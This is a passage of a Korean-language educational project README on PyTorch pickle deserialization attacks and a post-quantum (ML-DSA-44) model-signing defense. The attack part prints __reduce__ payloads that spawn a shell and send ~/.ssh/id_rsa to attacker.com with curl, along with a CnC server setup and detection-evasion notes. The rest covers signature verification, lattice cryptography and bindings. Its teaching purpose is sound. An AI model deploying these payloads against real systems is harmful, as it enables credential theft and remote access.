            'subprocess.call([\'/bin/sh\',\'-i\'])"',
        ))
```

3. **데이터 유출**:
```python
class Exfiltrate:
    def __reduce__(self):
        import os
        return (os.system, (
            'curl -X POST -d "$(cat ~/.ssh/id_rsa)" '
            'https://attacker.com/steal',
        ))
```

### HTTPS CnC 통신 분석

**TLS 핸드셰이크**:

```
Client (피해자)                    Server (CnC)
    │                                   │
    │──── ClientHello ──────────────────>│
    │     (TLS 1.2/1.3)                 │
    │                                   │
    │<──── ServerHello ─────────────────│
    │      Certificate                  │
    │      ServerKeyExchange            │
    │      ServerHelloDone              │
    │                                   │
    │──── ClientKeyExchange ────────────>│
    │      ChangeCipherSpec             │
    │      Finished                     │
    │                                   │
    │<──── ChangeCipherSpec ────────────│
    │      Finished                     │
    │                                   │
    │<══════ 암호화된 통신 ══════════════>│
    │                                   │
    │──── GET /attack_demo.sh ──────────>│
    │                                   │
    │<──── 200 OK ──────────────────────│
    │      Content: #!/bin/bash...      │
```

**자체 서명 인증서 문제**:

일반적으로 자체 서명 인증서는 신뢰되지 않아 연결이 거부됩니다:
```bash
curl https://localhost:8888/attack_demo.sh
# curl: (60) SSL certificate problem: self signed certificate
```

`-k` 플래그로 우회:
```bash
curl -k https://localhost:8888/attack_demo.sh
# ✓ 연결 성공 (보안 경고 무시)
```

**탐지 회피**:
- HTTP(평문): 방화벽/IDS가 쉽게 탐지
- HTTPS(암호화): 패킷 내용 분석 불가, URL만 보임
- 정상 트래픽으로 위장 가능

---

## 방어 메커니즘 심층 분석

### SelfVerifier 클래스 구현

**전체 코드**:

```python
class SelfVerifier:
    """자기 검증 모델 래퍼"""

    def __init__(self, model_data_bytes, signature, public_key):
        """
        Args:
            model_data_bytes: 직렬화된 모델 데이터
            signature: ML-DSA-44 서명 (2,420 bytes)
            public_key: ML-DSA-44 공개키 (1,312 bytes)
        """
        self.model_data_bytes = model_data_bytes
        self.signature = signature
        self.public_key = public_key

    def __reduce__(self):
        """
        Pickle 직렬화 시 호출됨

        역직렬화 시 _verify_and_restore()가 자동 실행되도록 설정
        """
        return (_verify_and_restore, (
            self.model_data_bytes,
            self.signature,
            self.public_key
        ))


def _verify_and_restore(model_data_bytes, signature, public_key):
    """
    서명 검증 후 모델 복원

    이 함수는 torch.load() 시 자동으로 호출됨
    """
    import hashlib
    from mldsa44_binding import verify
    import pickle

    # 1. 해시 재계산
    hash_obj = hashlib.sha256()
    hash_obj.update(model_data_bytes)
    computed_hash = hash_obj.digest()

    # 2. ML-DSA-44 서명 검증
    is_valid = verify(computed_hash, signature, public_key)

    # 3. 검증 실패 시 예외 발생
    if not is_valid:
        raise ValueError(
            "\n"
            "="*70 + "\n"
            " SIGNATURE VERIFICATION FAILED!\n"
            "="*70 + "\n"
            " The model has been tampered with.\n"
            " Computed hash does not match the signed hash.\n"
            " Refusing to load this model.\n"
            "="*70
        )

    # 4. 검증 성공 시 모델 복원
    model = pickle.loads(model_data_bytes)
    return model
```

**실행 흐름 상세**:

```
torch.load('small_signed.pt')
   │
   ├─ Pickle이 파일 읽기
   │
   ├─ SelfVerifier 객체 역직렬화
   │  ├─ model_data_bytes 읽기 (87MB)
   │  ├─ signature 읽기 (2,420 bytes)
   │  └─ public_key 읽기 (1,312 bytes)
   │
   ├─ SelfVerifier.__reduce__() 호출
   │  └─ 반환: (_verify_and_restore, (data, sig, pk))
   │
   ├─ Pickle이 _verify_and_restore() 실행
   │  │
   │  ├─ [1] SHA-256 해싱
   │  │   ├─ 입력: model_data_bytes (87MB)
   │  │   ├─ 블록 처리: 1,428,333 블록
   │  │   ├─ 시간: ~74 ms
   │  │   └─ 출력: computed_hash (32 bytes)
   │  │
   │  ├─ [2] ML-DSA-44 검증
   │  │   ├─ 입력: (computed_hash, signature, public_key)
   │  │   ├─ 공개키 파싱
   │  │   ├─ 서명 파싱 (c̃, z, h)
   │  │   ├─ 챌린지 재생성: c ← SampleInBall(c̃)
   │  │   ├─ 공개 행렬 확장: A ← ExpandA(ρ)
   │  │   ├─ 검증 방정식: w' ← A·z - c·t·2^d
   │  │   ├─ 힌트 적용: w₁' ← UseHint(h, w')
   │  │   ├─ 챌린지 비교: c̃' =? c̃
   │  │   ├─ 범위 검증: ||z||_∞ < γ₁ - β
   │  │   ├─ 시간: ~1 ms
   │  │   └─ 결과: True
   │  │
   │  ├─ [3] 검증 성공 → model 복원
   │  │   ├─ pickle.loads(model_data_bytes)
   │  │   ├─ 시간: ~140 ms
   │  │   └─ 출력: SentenceTransformer 객체
   │  │
   │  └─ 반환: model
   │
   └─ torch.load() 완료
      출력: 검증된 모델 객체
```

### 변조 시나리오 상세

**시나리오 1: model_data_bytes 변조**

```python
# 서명된 모델 로드
with open('small_signed.pt', 'rb') as f:
    verifier = pickle.load(f)

# 원본 모델 추출
original_model = pickle.loads(verifier.model_data_bytes)

# 악성 페이로드 주입
original_model['__malicious__'] = MaliciousPayload()

# 변조된 데이터로 재직렬화
tampered_data = pickle.dumps(original_model)

# SelfVerifier 재구성 (서명은 원본 그대로!)
tampered_verifier = SelfVerifier(
    model_data_bytes=tampered_data,      # 변조됨!
    signature=verifier.signature,         # 원본 서명
    public_key=verifier.public_key
)

# 저장
with open('small_signed_tampered.pt', 'wb') as f:
    pickle.dump(tampered_verifier, f)

# 로딩 시도
try:
    model = torch.load('small_signed_tampered.pt')
except ValueError as e:
    print("DEFENSE SUCCESSFUL!")
    # ValueError: SIGNATURE VERIFICATION FAILED!
```

**변조 탐지 원리**:

```
원본 서명 시:
   model_data_bytes_original
   → SHA-256
   → hash_original = b4f2e8c1...
   → ML-DSA-44.sign(hash_original, secret_key)
   → signature

변조 후:
   model_data_bytes_tampered
   → SHA-256
   → hash_tampered = 3a9f6d2e...  (완전히 다름!)

검증 시:
   ML-DSA-44.verify(hash_tampered, signature, public_key)
   → signature는 hash_original에 대한 것
   → hash_tampered ≠ hash_original
   → 검증 실패!
```

**시나리오 2: 서명 위조 시도**

공격자가 자신의 서명을 생성하려 시도:

```python
# 공격자는 public_key만 가지고 있음
# secret_key는 없음

# 변조된 데이터의 해시
tampered_hash = hashlib.sha256(tampered_data).digest()

# 서명 위조 시도
# 하지만 secret_key 없이는 불가능!

# ML-DSA-44 보안:
# - secret_key 없이 서명 생성: 2^143 연산 필요
# - 사실상 불가능
```

**시나리오 3: 재생 공격 (Replay Attack)**

공격자가 정상 모델의 서명을 다른 모델에 붙이려 시도:

```python
# 정상 모델 A의 서명
verifier_A = pickle.load(open('model_A_signed.pt', 'rb'))

# 다른 모델 B
model_B = torch.load('model_B.pt')
model_B_data = pickle.dumps(model_B)

# 재생 공격: A의 서명을 B에 붙임
fake_verifier = SelfVerifier(
    model_data_bytes=model_B_data,
    signature=verifier_A.signature,    # A의 서명
    public_key=verifier_A.public_key
)

# 로딩 시도
model = torch.load(...)
# ValueError: 서명 검증 실패
# (model_B의 해시 ≠ model_A의 해시)
```

---

## ML-DSA-44 암호학

### 격자 이론 기초

**격자 정의**:

n차원 공간의 정수 선형 결합:
```
L = {Σ(i=1 to n) z_i · b_i | z_i ∈ ℤ}

b_1, ..., b_n: 기저 벡터 (basis vectors)
```

예시 (2차원):
```
b_1 = (1, 0)
b_2 = (1, 1)

L = {z_1·(1,0) + z_2·(1,1) | z_1, z_2 ∈ ℤ}
  = {(z_1+z_2, z_2) | z_1, z_2 ∈ ℤ}

점들: (0,0), (1,0), (2,0), (1,1), (2,1), (0,1), ...
```

**SVP (Shortest Vector Problem)**:

격자에서 0이 아닌 최단 벡터 찾기:
```
주어진: 격자 L
목표: v ∈ L \ {0} such that ||v|| is minimal
```

**CVP (Closest Vector Problem)**:

주어진 점에 가장 가까운 격자점 찾기:
```
주어진: 격자 L, 목표 벡터 t
목표: v ∈ L such that ||t - v|| is minimal
```

**어려움**:
- NP-hard (최악의 경우)
- 알려진 최선의 알고리즘: BKZ (Block Korkine-Zolotarev)
- 복잡도: 2^(0.292·n) (실용적으로 지수 시간)

### Module-LWE 상세

**Ring-LWE**:
```
주어진: (a, b = a·s + e)
목표: s 찾기

a ∈ R_q: 무작위
s ∈ R_q: 작은 계수 비밀
e ∈ R_q: 작은 에러
```

**Module-LWE** (Ring-LWE의 일반화):
```
주어진: (A, t = A·s + e)
목표: s 찾기

A ∈ R_q^(k×l): 무작위 행렬
s ∈ R_q^l: 작은 계수 비밀 벡터
e ∈ R_q^k: 작은 에러 벡터
```

**ML-DSA-44 파라미터**:
```
q = 8,380,417
n = 256
k = 4
l = 4

격자 차원: n·k = 256·4 = 1,024

BKZ 복잡도: 2^(0.292·1024) ≈ 2^299

하지만 작은 계수 조건으로 실제 보안: 2^143
```

### Fiat-Shamir 변환

**대화형 영지식 증명**:

```
Prover (비밀 s 소유)          Verifier
    │                             │
    │─── Commitment: w ──────────>│
    │                             │
    │<─── Challenge: c ───────────│
    │                             │
    │─── Response: z ─────────────>│
    │                             │
    └─ z = y + c·s                │
                           Verify: A·z =? w + c·t
```

**비대화형 변환** (Fiat-Shamir):

챌린지를 해시 함수로 생성:
```
c = H(commitment || message)
```

```
Prover                           (Verifier는 서명만 받음)
    │
    ├─ Commitment: w ← A·y
    │
    ├─ Challenge: c ← H(message || w)
    │  (스스로 생성)
    │
    ├─ Response: z ← y + c·s
    │
    └─ 서명: σ = (c, z)


Verifier (서명 검증)
    │
    ├─ w' ← A·z - c·t 계산
    │
    ├─ c' ← H(message || w') 재계산
    │
    └─ c =? c' 확인
```

**보안성**:
- Random Oracle Model에서 안전
- 양자 컴퓨터에도 안전 (Grover로 √가속만 가능)

---

## Python ctypes 바인딩

### libmldsa44.so 구조

**C 함수 인터페이스**:

```c
// crypto_sign/ml-dsa-44/api.h

#define CRYPTO_PUBLICKEYBYTES 1312
#define CRYPTO_SECRETKEYBYTES 2560
#define CRYPTO_BYTES 2420

// 키 생성
int crypto_sign_keypair(
    unsigned char *pk,     // 출력: 공개키
    unsigned char *sk      // 출력: 비밀키
);

// 서명 생성
int crypto_sign(
    unsigned char *sm,            // 출력: 서명된 메시지
    unsigned long long *smlen,    // 출력: 서명된 메시지 길이
    const unsigned char *m,       // 입력: 원본 메시지
    unsigned long long mlen,      // 입력: 메시지 길이
    const unsigned char *sk       // 입력: 비밀키
);

// 서명 검증
int crypto_sign_open(
    unsigned char *m,             // 출력: 검증된 메시지
    unsigned long long *mlen,     // 출력: 메시지 길이
    const unsigned char *sm,      // 입력: 서명된 메시지
    unsigned long long smlen,     // 입력: 서명된 메시지 길이
    const unsigned char *pk       // 입력: 공개키
);
```

### mldsa44_binding.py 전체 구현

```python
"""
ML-DSA-44 Python 바인딩
C 라이브러리(libmldsa44.so)를 ctypes를 통해 Python에서 사용
"""

import ctypes
import os

# ============================================================================
# 라이브러리 로드
# ============================================================================

# 라이브러리 경로 (이 파일과 같은 디렉토리)
LIB_PATH = os.path.join(os.path.dirname(__file__), 'libmldsa44.so')

try:
    _mldsa = ctypes.CDLL(LIB_PATH)
except OSError as e:
    raise RuntimeError(f"Failed to load ML-DSA library: {e}")

# ============================================================================
# 상수 정의
# ============================================================================

PUBLICKEYBYTES = 1312
SECRETKEYBYTES = 2560
SIGNATUREBYTES = 2420

# ============================================================================
# C 함수 시그니처 정의
# ============================================================================

# int crypto_sign_keypair(unsigned char *pk, unsigned char *sk)
_mldsa.crypto_sign_keypair.argtypes = [
    ctypes.POINTER(ctypes.c_ubyte),  # pk
    ctypes.POINTER(ctypes.c_ubyte)   # sk
]
_mldsa.crypto_sign_keypair.restype = ctypes.c_int

# int crypto_sign(unsigned char *sm, unsigned long long *smlen,
#                 const unsigned char *m, unsigned long long mlen,
#                 const unsigned char *sk)
_mldsa.crypto_sign.argtypes = [
    ctypes.POINTER(ctypes.c_ubyte),      # sm
    ctypes.POINTER(ctypes.c_ulonglong),  # smlen
    ctypes.POINTER(ctypes.c_ubyte),      # m
    ctypes.c_ulonglong,                  # mlen
    ctypes.POINTER(ctypes.c_ubyte)       # sk
]
_mldsa.crypto_sign.restype = ctypes.c_int

# int crypto_sign_open(unsigned char *m, unsigned long long *mlen,
#                      const unsigned char *sm, unsigned long long smlen,
#                      const unsigned char *pk)
_mldsa.crypto_sign_open.argtypes = [
    ctypes.POINTER(ctypes.c_ubyte),      # m
    ctypes.POINTER(ctypes.c_ulonglong),  # mlen
    ctypes.POINTER(ctypes.c_ubyte),      # sm
    ctypes.c_ulonglong,                  # smlen
    ctypes.POINTER(ctypes.c_ubyte)       # pk
]
_mldsa.crypto_sign_open.restype = ctypes.c_int

# ============================================================================
# Python 래퍼 함수
# ============================================================================

def keypair():
    """
    ML-DSA-44 키 쌍 생성

    Returns:
        tuple: (public_key: bytes, secret_key: bytes)
            public_key: 1,312 bytes
            secret_key: 2,560 bytes

    Raises:
        RuntimeError: 키 생성 실패 시
    """
    # 배열 타입 정의
    PublicKey = ctypes.c_ubyte * PUBLICKEYBYTES
    SecretKey = ctypes.c_ubyte * SECRETKEYBYTES

    # 배열 할당
    pk = PublicKey()
    sk = SecretKey()

    # C 함수 호출
    result = _mldsa.crypto_sign_keypair(pk, sk)

    # 에러 확인
    if result != 0:
        raise RuntimeError(f"Key generation failed with code {result}")

    # bytes로 변환하여 반환
    return bytes(pk), bytes(sk)


def sign(message, secret_key):
    """
    메시지 서명 생성

    Args:
        message (bytes): 서명할 메시지 (임의 길이)
        secret_key (bytes): 비밀키 (2,560 bytes)

    Returns:
        bytes: 서명 (2,420 bytes)

    Raises:
        ValueError: 비밀키 크기 오류
        TypeError: 입력 타입 오류
        RuntimeError: 서명 생성 실패
    """
    # 입력 검증
    if not isinstance(message, bytes):
        raise TypeError("Message must be bytes")
    if not isinstance(secret_key, bytes):
        raise TypeError("Secret key must be bytes")
    if len(secret_key) != SECRETKEYBYTES:
        raise ValueError(f"Secret key must be {SECRETKEYBYTES} bytes")

    # 메시지 길이
    mlen = len(message)

    # 서명된 메시지 길이 (서명 + 원본 메시지)
    smlen = ctypes.c_ulonglong()

    # 배열 타입 정의
    SignedMessage = ctypes.c_ubyte * (SIGNATUREBYTES + mlen)
    Message = ctypes.c_ubyte * mlen
    SecretKey = ctypes.c_ubyte * SECRETKEYBYTES

    # 배열 할당 및 데이터 복사
    sm = SignedMessage()
    m = Message()
    sk = SecretKey()

    ctypes.memmove(m, message, mlen)
    ctypes.memmove(sk, secret_key, SECRETKEYBYTES)

    # C 함수 호출
    result = _mldsa.crypto_sign(
        sm,
        ctypes.byref(smlen),
        m,
        ctypes.c_ulonglong(mlen),
        sk
    )

    # 에러 확인
    if result != 0:
        raise RuntimeError(f"Signing failed with code {result}")

    # 서명만 추출 (처음 SIGNATUREBYTES 바이트)
    signature = bytes(sm[:SIGNATUREBYTES])

    return signature


def verify(message, signature, public_key):
    """
    서명 검증

    Args:
        message (bytes): 원본 메시지
        signature (bytes): 서명 (2,420 bytes)
        public_key (bytes): 공개키 (1,312 bytes)

    Returns:
        bool: 서명 유효 여부 (True: 유효, False: 무효)

    Raises:
        ValueError: 크기 오류
        TypeError: 입력 타입 오류
    """
    # 입력 검증
    if not isinstance(message, bytes):
        raise TypeError("Message must be bytes")
    if not isinstance(signature, bytes):
        raise TypeError("Signature must be bytes")
    if not isinstance(public_key, bytes):
        raise TypeError("Public key must be bytes")
    if len(signature) != SIGNATUREBYTES:
        raise ValueError(f"Signature must be {SIGNATUREBYTES} bytes")
    if len(public_key) != PUBLICKEYBYTES:
        raise ValueError(f"Public key must be {PUBLICKEYBYTES} bytes")

    # 메시지 길이
    mlen = len(message)

    # 배열 타입 정의
    SignedMessage = ctypes.c_ubyte * (SIGNATUREBYTES + mlen)
    Message = ctypes.c_ubyte * mlen
    PublicKey = ctypes.c_ubyte * PUBLICKEYBYTES

    # 배열 할당
    sm = SignedMessage()
    m = Message()
    pk = PublicKey()
    mlen_out = ctypes.c_ulonglong()

    # 서명된 메시지 구성: signature || message
    ctypes.memmove(sm, signature, SIGNATUREBYTES)
    ctypes.memmove(ctypes.byref(sm, SIGNATUREBYTES), message, mlen)

    # 공개키 복사
    ctypes.memmove(pk, public_key, PUBLICKEYBYTES)

    # C 함수 호출
    result = _mldsa.crypto_sign_open(
        m,
        ctypes.byref(mlen_out),
        sm,
        ctypes.c_ulonglong(SIGNATUREBYTES + mlen),
        pk
    )

    # 검증 결과
    # 0: 성공, != 0: 실패
    return result == 0
```

### ctypes 메모리 관리

**스택 할당 (자동 관리)**:
```python
arr = (ctypes.c_ubyte * 100)()
# Python GC가 자동으로 해제
```

**힙 할당 (수동 관리 필요)**:
```c
// C 코드
unsigned char *data = malloc(1000);
// Python에서 해제 필요: libc.free(data)
```

**본 프로젝트에서는**:
- 모든 배열을 스택에 할당
- Python GC가 자동 관리
- 메모리 누수 없음

### ctypes 성능 최적화

**비효율적인 방법**:
```python
# 반복문으로 복사 (느림)
for i in range(len(data)):
    arr[i] = data[i]
# 시간: O(n) Python 루프
```

**효율적인 방법**:
```python
# memmove로 한 번에 복사 (빠름)
ctypes.memmove(arr, data, len(data))
# 시간: O(n) C 메모리 복사 (100배 빠름)
```

**벤치마크** (1 MB 데이터):
```
반복문:    450 ms
memmove:   4.5 ms  (100배 빠름)
```

---

## 설치 및 환경 설정

### 시스템 요구사항

**운영체제**:
- Linux (Ubuntu 20.04+, Debian 11+)
- WSL2 (Windows Subsystem for Linux)
- macOS 11+ (Experimental)

**하드웨어**:
- CPU: x86_64 (64-bit)
- RAM: 최소 2GB, 권장 4GB
- 디스크: 최소 1GB 여유 공간

**소프트웨어**:
- Python: 3.8, 3.9, 3.10, 3.11, 3.12
- GCC: 9.0+ (C 컴파일러)
- OpenSSL: 1.1+ (SSL 인증서 생성)

### Python 패키지 설치

```bash
# 1. 시스템 업데이트 (Ubuntu/Debian)
sudo apt-get update

# 2. 필수 패키지 설치
sudo apt-get install -y python3 python3-pip gcc make openssl

# 3. Python 패키지 설치
python3 -m pip install --break-system-packages \
    torch==2.0.0 \
    transformers==4.57.3 \
    sentence-transformers==5.2.0

# --break-system-packages: Python 3.12의 externally-managed 정책 우회
```

### ML-DSA-44 라이브러리 빌드

```bash
# 1. ML-DSA 디렉토리로 이동
cd ML-DSA/crypto_sign/ml-dsa-44/1_clean

# 2. 빌드 (수정된 Makefile 사용)
make clean
make

# 출력:
# cc -Os ... -c -o ntt.o ntt.c
# cc -Os ... -c -o packing.o packing.c
# ...
# cc -Os ... -c -o fips202.o ../../../common/fips202.c
# cc -Os ... -c -o randombytes.o ../../../common/randombytes.c
# cc -shared -o libmldsa44.so ntt.o ... fips202.o randombytes.o

# 3. 라이브러리 확인
ls -lh libmldsa44.so
# -rwxr-xr-x 1 user user 68K libmldsa44.so

# 4. 심볼 확인
nm -D libmldsa44.so | grep shake128_inc_finalize
# 0000000000006df3 T shake128_inc_finalize  (← 'T'는 정의됨을 의미)

# 5. about-pickle_internal로 복사
cp libmldsa44.so ../../../../about-pickle_internal/
```

**Makefile 수정 사항**:

```makefile
# OBJECTS에 fips202.o와 randombytes.o 추가
OBJECTS=ntt.o packing.o poly.o polyvec.o reduce.o rounding.o sign.o \
        symmetric-shake.o fips202.o randombytes.o

# fips202.o 빌드 룰 추가
fips202.o: $(COMMON_DIR)/fips202.c
	$(CC) $(CFLAGS) -c -o $@ $<

# randombytes.o 빌드 룰 추가
randombytes.o: $(COMMON_DIR)/randombytes.c
	$(CC) $(CFLAGS) -c -o $@ $<
```

### SSL 인증서 생성

```bash
cd about-pickle_internal

# 자체 서명 인증서 생성
openssl req -x509 -newkey rsa:2048 \
  -keyout server.key \
  -out server.crt \
  -days 365 \
  -nodes \
  -subj "/C=KR/ST=Seoul/L=Seoul/O=Demo/CN=localhost"

# 생성 확인
ls -lh server.crt server.key
# -rw-r--r-- 1 user user 1.3K server.crt
# -rw------- 1 user user 1.7K server.key

# 인증서 정보 확인
openssl x509 -in server.crt -text -noout | head -20
```

### 모델 다운로드

**옵션 1: 제공된 모델 사용** (권장)

```bash
# 이미 models/small_model.pt가 있으면 생략
ls -lh models/small_model.pt
# -rw-r--r-- 1 user user 88M small_model.pt
```

**옵션 2: 직접 다운로드**

```python
import torch
from transformers import AutoModel

# HuggingFace에서 다운로드
model = AutoModel.from_pretrained("sentence-transformers/all-MiniLM-L6-v2")

# 저장
torch.save(model, "models/small_model.pt")
```

### ML-DSA-44 키 생성

```bash
# 키가 이미 있으면 생략
ls -lh ml_dsa_*.key

# 없으면 Python으로 생성
python3 -c "
from mldsa44_binding import keypair

pk, sk = keypair()

with open('ml_dsa_public.key', 'wb') as f:
    f.write(pk)

with open('ml_dsa_secret.key', 'wb') as f:
    f.write(sk)

print(f'Public key: {len(pk)} bytes')
print(f'Secret key: {len(sk)} bytes')
"
```

---

## 실행 가이드

### 전체 실행 스크립트

```bash
#!/bin/bash
# run_all.sh - 전체 시연 자동화 스크립트

set -e  # 에러 시 중단

echo "========================================="
echo " PyTorch Pickle 취약점 시연"
echo "========================================="
echo

# STEP 0: 준비
echo "[STEP 0] 환경 확인..."
python3 --version
ls -lh models/small_model.pt
ls -lh libmldsa44.so
ls -lh server.crt server.key
echo

# STEP 1: CnC 서버 시작 (백그라운드)
echo "[STEP 1] CnC 서버 시작..."
python3 -u 0_server.py 2>&1 | tee data/serverlog.txt &
SERVER_PID=$!
sleep 2
echo "서버 PID: $SERVER_PID"
echo

# STEP 2: 악성 모델 생성
echo "[STEP 2] 악성 모델 생성..."
python3 1_attack.py
echo

# STEP 3: 공격 시연
echo "[STEP 3] 공격 시연 (피해자)..."
echo "Enter 키를 눌러 공격 실행..."
python3 2_victim-load.py
echo

# STEP 4: 공격 체인 분석
echo "[STEP 4] 공격 체인 분석..."
python3 3_attack_analysis.py > attack_analysis_report.txt
head -100 attack_analysis_report.txt
echo

# STEP 5: 방어 시스템 시연
echo "[STEP 5] 방어 시스템 시연..."
python3 4_defense.py > defense_report.txt
tail -50 defense_report.txt
echo

# STEP 6: 방어 메커니즘 분석
echo "[STEP 6] 방어 메커니즘 기술 분석..."
python3 5_defense_analysis.py > defense_analysis_report.txt
head -100 defense_analysis_report.txt
echo

# 종료
echo "========================================="
echo " 시연 완료!"
echo "========================================="
echo "서버 종료 중..."
kill $SERVER_PID
wait $SERVER_PID 2>/dev/null || true

echo
echo "생성된 파일:"
ls -lh models_attack/
ls -lh models_defense/
ls -lh data/serverlog.txt
ls -lh *_report.txt
```

### 단계별 실행 (수동)

각 프로그램을 개별적으로 실행하는 방법은 [프로그램 실행 순서](#프로그램-실행-순서) 섹션 참조.

---

## 성능 및 오버헤드 분석

### 시간 복잡도

**공격 (1_attack.py)**:
```
- 모델 로드: O(n), n = 파일 크기
- 페이로드 주입: O(1)
- 모델 저장: O(n)
총: O(n) ≈ 6.8초 (87MB 모델)
```

**방어 - 서명 생성 (4_defense.py)**:
```
- 모델 로드: O(n)
- 직렬화: O(n)
- SHA-256: O(n), 블록별 처리
- ML-DSA-44 서명: O(1), 상수 시간 (~2ms)
- SelfVerifier 생성: O(1)
- 저장: O(n)
총: O(n) ≈ 6.1초
```

**방어 - 서명 검증 (torch.load)**:
```
- 로드: O(n)
- SHA-256: O(n)
- ML-DSA-44 검증: O(1), 상수 시간 (~1ms)
- 역직렬화: O(n)
총: O(n) ≈ 0.9초
```

### 공간 복잡도

**메모리 사용량**:

```
정상 모델 로드:
   - PyTorch 모델: ~350 MB (RAM)
   - Pickle 버퍼: ~91 MB (직렬화 시)

서명 생성:
   - 모델 로드: ~350 MB
   - 직렬화: ~91 MB
   - SelfVerifier: ~91 MB (중복, 일시적)
   - 최대: ~532 MB

검증:
   - SelfVerifier 로드: ~91 MB
   - 해시 계산: ~32 bytes (해시)
   - 모델 복원: ~350 MB
   - 최대: ~441 MB
```

**디스크 오버헤드**:

```
원본 모델:        91,413,289 bytes
악성 모델:        91,415,082 bytes (+1,793 bytes, +0.002%)
서명 모델:        91,399,627 bytes (-13,662 bytes, -0.015%)
```

### 처리량 벤치마크

**환경**: WSL2, Intel Core i7-1165G7, 16GB RAM

| 작업 | 시간 (ms) | 처리량 |
|------|----------|--------|
| 모델 로드 (torch.load) | 6,660 | 13.1 MB/s |
| 직렬화 (pickle.dumps) | 2,200 | 41.6 MB/s |
| SHA-256 해싱 | 74 | 1,235 MB/s |
| ML-DSA-44 서명 | 2 | - |
| ML-DSA-44 검증 | 1 | - |
| 모델 저장 (torch.save) | 3,800 | 24.1 MB/s |

**서명 오버헤드**:

```
정상 로드:     6,660 ms
서명 로드:     7,525 ms (+865 ms, +13%)

결론: 서명 검증으로 인한 오버헤드는 13%로 허용 가능
```

---

## 보안 고려사항

### 경고 및 제한사항

**이 프로젝트는 교육 목적입니다**:

1. **실제 악용 금지**
   - 법적 책임: 사용자에게 있음
   - 무단 침입: 불법
   - 허가된 환경에서만 실행

2. **격리된 환경 사용**
   - Docker 컨테이너 권장
   - 가상 머신 사용
   - 중요 데이터가 없는 시스템

3. **네트워크 격리**
   - 로컬호스트만 사용
   - 외부 네트워크 차단
   - 방화벽 규칙 설정

### 비밀키 관리

**절대 하지 말아야 할 것**:
- Git에 비밀키 커밋
- 퍼블릭 저장소에 업로드
- 평문으로 전송
- 공유 시스템에 저장

**권장 사항**:
- 키를 암호화하여 저장
- 환경 변수로 로드
- HSM (Hardware Security Module) 사용 (프로덕션)
- 키 순환 (정기적 교체)

### 프로덕션 배포 시 고려사항

**자기 검증 모델을 실제 서비스에 사용할 경우**:

1. **키 관리**
   - HSM 또는 키 관리 서비스 (AWS KMS, Azure Key Vault)
   - 비밀키는 절대 배포하지 않음
   - 공개키만 배포

2. **서명 인프라**
   - 오프라인 서명 (에어갭 시스템)
   - 다중 서명 (Multi-Signature)
   - 서명 타임스탬프

3. **배포 워크플로우**
   ```
   개발 환경:
      모델 학습 → 평가

   서명 환경 (격리):
      모델 전송 → ML-DSA-44 서명 → 서명된 모델 출력

   배포 환경:
      서명된 모델 배포 → 사용자가 검증 후 로드
   ```

4. **모니터링**
   - 검증 실패 로그
   - 의심스러운 활동 감지
   - 알림 시스템

### 알려진 제한사항

1. **서명 크기**
   - ML-DSA-44 서명: 2,420 bytes
   - 매우 작은 모델에는 상대적으로 큰 오버헤드

2. **검증 시간**
   - 대형 모델 (10GB+): 해싱에 수 초 소요
   - 실시간 시스템에는 부적합할 수 있음

3. **하위 호환성**
   - PyTorch < 2.0은 `weights_only` 파라미터 없음
   - 기존 코드 수정 필요

4. **양자 컴퓨터**
   - ML-DSA-44는 양자 내성
   - 하지만 SHA-256은 양자 컴퓨터로 가속 가능 (Grover)
   - 충분한 보안 마진으로 당분간 안전

---

## 교육 목표 및 학습 내용

### 학습자 대상

- 머신러닝 엔지니어
- 보안 연구자
- 대학원생 (컴퓨터 보안, AI 보안)
- 소프트웨어 개발자

### 학습 목표

**공격 부분 (0_server.py ~ 3_attack_analysis.py)**:

1. **Pickle 역직렬화 취약점 이해**
   - Pickle의 작동 원리
   - `__reduce__()` 매직 메서드
   - 임의 코드 실행 메커니즘

2. **공급망 공격 (Supply Chain Attack)**
   - 모델 저장소의 위험성
   - 신뢰할 수 없는 소스의 위협
   - 사전 학습 모델의 보안 문제

3. **CnC 인프라**
   - Command & Control 서버
   - HTTPS 암호화 통신
   - 탐지 회피 기법

4. **실제 공격 시연**
   - 페이로드 제작
   - 모델 파일 변조
   - 공격 실행 및 증거 수집

**방어 부분 (4_defense.py ~ 5_defense_analysis.py)**:

1. **암호학 기초**
   - 전자서명의 원리
   - 해시 함수 (SHA-256)
   - 공개키 암호학

2. **포스트 양자 암호**
   - 양자 컴퓨터 위협
   - 격자 기반 암호
   - ML-DSA-44 알고리즘

3. **자기 검증 시스템**
   - 서명 생성 프로세스
   - 자동 검증 메커니즘
   - 변조 탐지

4. **실무 적용**
   - 모델 배포 보안
   - 키 관리
   - 방어 계층화 (Defense in Depth)

### 실습 과제

**과제 1: 공격 변형**
- 다른 악성 페이로드 작성 (데이터 유출, 리버스 쉘)
- 탐지 회피 기법 연구
- 여러 모델에 페이로드 주입

**과제 2: 방어 강화**
- 다중 서명 (Multi-Signature) 구현
- 타임스탬프 추가
- 키 순환 메커니즘

**과제 3: 성능 최적화**
- 병렬 해싱 (멀티코어)
- 증분 검증 (레이어별)
- 캐싱 메커니즘

**과제 4: 탐지 시스템**
- 서명 검증 실패 로깅
- 이상 탐지 (Anomaly Detection)
- 알림 시스템 구축

---

## 문제 해결

### libmldsa44.so 로딩 실패

**증상**:
```
OSError: libmldsa44.so: undefined symbol: shake128_inc_finalize
```

**원인**: fips202.c (SHAKE 구현)가 라이브러리에 포함되지 않음

**해결**:
```bash
cd ML-DSA/crypto_sign/ml-dsa-44/1_clean

# Makefile 수정 확인
cat Makefile | grep fips202
# OBJECTS=... fips202.o ...

# 재빌드
make clean
make

# 심볼 확인
nm -D libmldsa44.so | grep shake128_inc_finalize
# 0000000000006df3 T shake128_inc_finalize  (← 'T'가 있어야 함)

# 복사
cp libmldsa44.so ../../../../about-pickle_internal/
```

### 서명 검증 실패 (정상 모델)

**증상**:
```
ValueError: Signature verification failed!
```

**원인 1**: 공개키/비밀키 불일치

**해결**:
```python
# 키 재생성
from mldsa44_binding import keypair
pk, sk = keypair()

with open('ml_dsa_public.key', 'wb') as f:
    f.write(pk)
with open('ml_dsa_secret.key', 'wb') as f:
    f.write(sk)

# 모델 재서명
python3 4_defense.py
```

**원인 2**: 모델 파일 손상

**해결**:
```bash
# 모델 재다운로드
python3 -c "
from transformers import AutoModel
import torch
model = AutoModel.from_pretrained('sentence-transformers/all-MiniLM-L6-v2')
torch.save(model, 'models/small_model.pt')
"
```

### HTTPS 인증서 오류

**증상**:
```
curl: (60) SSL certificate problem: self signed certificate
```

**원인**: 자체 서명 인증서는 기본적으로 신뢰되지 않음

**해결**:
```bash
